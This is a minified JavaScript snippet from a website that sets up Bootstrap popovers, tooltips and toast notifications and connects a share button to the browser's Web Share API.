popoverTriggerList=document.querySelectorAll('[data-bs-toggle="popover"]'),popoverList=[...popoverTriggerList].map(popoverTriggerEl=>new bootstrap.Popover(popoverTriggerEl));function webShareAPI(title,description,link){navigator.share({title,text:description,url:link}).then(()=>console.log("Successful share")).catch(error=>console.log("Error sharing",error))}const shareBtn=document.getElementById("btn-webshare");if(shareBtn!==null)if(navigator.share){const title=shareBtn.getAttribute("data-sharing-title"),description=shareBtn.getAttribute("data-sharing-description"),url=shareBtn.getAttribute("data-sharing-url");shareBtn.style.display="block",shareBtn.addEventListener("click",()=>webShareAPI(title,description,url))}else shareBtn.style.display="none";const container=document.getElementById("toast-container");container!==null&&document.querySelectorAll("[data-toast-target]").forEach(trigger=>{const target=document.getElementById(trigger.getAttribute("data-toast-target"));if(target!==null){container.appendChild(target);const toast=bootstrap.Toast.getOrCreateInstance(target);toast!==null&&trigger.addEventListener("click",()=>{toast.show()})}});const tooltipTriggerList=document.querySelectorAll('[data-bs-toggle="tooltip"]'),tooltipList=[...tooltipTriggerList].map(tooltipTriggerEl=>new bootstrap.Tooltip(tooltipTriggerEl))